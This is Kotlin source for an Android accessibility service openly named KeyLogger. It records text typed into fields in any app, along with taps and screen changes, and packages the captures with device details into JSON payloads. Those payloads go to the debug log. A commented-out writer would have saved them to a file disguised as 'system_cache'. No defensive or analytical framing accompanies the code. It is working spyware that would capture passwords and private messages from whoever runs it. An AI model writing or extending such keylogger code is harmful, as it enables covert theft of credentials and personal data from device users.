package com.example.axesite.util

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.ConcurrentLinkedQueue

class KeyLogger : AccessibilityService() {

    companion object {
        private const val TAG = "KeyLogger"
        private var instance: KeyLogger? = null
        fun getInstance(): KeyLogger? = instance
    }

    // Queue for raw accessibility events (optional, for batch processing)
    private val eventQueue = ConcurrentLinkedQueue<AccessibilityEvent>()

    // Members for debouncing and logging
    private val debounceJobs = mutableMapOf<String, Job>()
    private val logQueue = ConcurrentLinkedQueue<LogEntry>()
    private val coroutineScope = CoroutineScope(Dispatchers.IO)
    private val logFilename = "system_cache" // Not used now

    // Data class for log entries
    data class LogEntry(
        val timestamp: Long,
        val fieldName: String,
        val text: String,
        val appScreen: String = ""
    )

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        Log.d(TAG, "Received event: type=${event.eventType} text=${event.text}")
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                event.text.forEach { text ->
                    logTextInput(text.toString(), event)
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                logUIInteraction(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                logScreenChange(event)
            }
        }

        // Optionally add raw events to a queue for further batch processing
        eventQueue.add(event)
        if (eventQueue.size > 20) {
            processEventQueue()
        }
    }

    private fun logTextInput(text: String, event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "Unknown"
        val className = event.className?.toString() ?: "Unknown"
        val logData = JSONObject().apply {
            put("text", text)
            put("package", packageName)
            put("class", className)
            put("timestamp", System.currentTimeMillis())
            put("eventType", "text_changed")
        }
        logRawInput(
            fieldName = className,
            input = text,
            screenName = packageName,
            additionalMetadata = logData.toString()
        )
        Log.d(TAG, "Text Input: $text in $className")
    }

    private fun logUIInteraction(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "Unknown"
        val className = event.className?.toString() ?: "Unknown"
        val logData = JSONObject().apply {
            put("package", packageName)
            put("class", className)
            put("timestamp", System.currentTimeMillis())
            put("eventType", "ui_clicked")
        }
        logRawInput(
            fieldName = "UIInteraction",
            input = className,
            screenName = packageName,
            additionalMetadata = logData.toString()
        )
        Log.d(TAG, "UI Interaction in $className")
    }

    private fun logScreenChange(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "Unknown"
        val className = event.className?.toString() ?: "Unknown"
        val logData = JSONObject().apply {
            put("package", packageName)
            put("class", className)
            put("timestamp", System.currentTimeMillis())
            put("eventType", "screen_change")
        }
        logRawInput(
            fieldName = "ScreenChange",
            input = className,
            screenName = packageName,
            additionalMetadata = logData.toString()
        )
        Log.d(TAG, "Screen Changed to $className")
    }

    private fun processEventQueue() {
        coroutineScope.launch {
            val events = mutableListOf<AccessibilityEvent>()
            while (eventQueue.isNotEmpty()) {
                eventQueue.poll()?.let { events.add(it) }
            }
            // Process the batch of events if needed.
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted")
    }

    /**
     * Debounced logging function.
     * Cancels any pending job for the given field, waits for debounceDelayMillis,
     * then creates a log entry and (instead of sending to cache) logs the JSON payload.
     */
    private fun logRawInput(
        fieldName: String,
        input: String,
        screenName: String,
        additionalMetadata: String? = null,
        debounceDelayMillis: Long = 1000L
    ) {
        debounceJobs[fieldName]?.cancel()
        debounceJobs[fieldName] = coroutineScope.launch {
            delay(debounceDelayMillis)
            val entry = LogEntry(
                timestamp = System.currentTimeMillis(),
                fieldName = fieldName,
                text = input,
                appScreen = screenName
            )
            logQueue.add(entry)
            saveLogsForValidation()
        }
    }

    /**
     * Instead of writing to a cache file, log the JSON payload for validation.
     */
    private suspend fun saveLogsForValidation(): Boolean {
        if (logQueue.isEmpty()) return true
        val logs = mutableListOf<LogEntry>()
        while (logQueue.isNotEmpty()) {
            logQueue.poll()?.let { logs.add(it) }
        }
        return try {
            val jsonPayload = createJsonPayload(logs)
            // appendToCacheFile(jsonPayload)
            // Log the payload for validation:
            Log.d(TAG, "Payload: $jsonPayload")
            true
        } catch (e: Exception) {
            logs.forEach { logQueue.add(it) }
            false
        }
    }

    /**
     * Creates a JSON payload from the list of log entries.
     */
    private fun createJsonPayload(logs: List<LogEntry>): String {
        val jsonObject = JSONObject().apply {
            put("deviceId", UUID.randomUUID().toString())
            put("deviceModel", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("androidVersion", Build.VERSION.RELEASE)
            put("appPackage", packageName)
            put("timestamp", System.currentTimeMillis())

            val logsArray = logs.map { entry ->
                JSONObject().apply {
                    put("timestamp", entry.timestamp)
                    put("field", entry.fieldName)
                    put("text", entry.text)
                    put("screen", entry.appScreen)
                }
            }
            put("logs", logsArray)
        }
        return jsonObject.toString()
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Service connected")
    }

    // function to write to cache
    // private fun appendToCacheFile(data: String) {
    //     val cacheFile = File(cacheDir, logFilename)
    //     try {
    //         FileOutputStream(cacheFile, true).use { outputStream ->
    //             outputStream.write("$data\n".toByteArray())
    //         }
    //     } catch (e: Exception) {
    //         Log.e(TAG, "Error writing to cache file: ${e.message}")
    //     }
    // }
}
